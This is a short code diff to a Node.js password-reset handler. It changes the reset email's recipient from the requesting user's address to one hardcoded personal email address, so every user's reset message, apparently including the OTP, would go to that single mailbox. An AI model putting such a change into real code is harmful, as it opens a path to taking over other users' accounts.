@@ -44,7 +44,6 @@ const forgotPassword = async (req, res) => {
     user.forgotPassword = otpExpiry;
     await user.save();
 
-
     // Email message
     const message = `
       <h1>Password Reset Request</h1>
@@ -58,7 +57,7 @@ const forgotPassword = async (req, res) => {
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
       // to: user.email,
-      to : email,
+      to : "teotiasiddhant@gmail.com",
       subject: 'Password Reset Request',
       html: message
     });
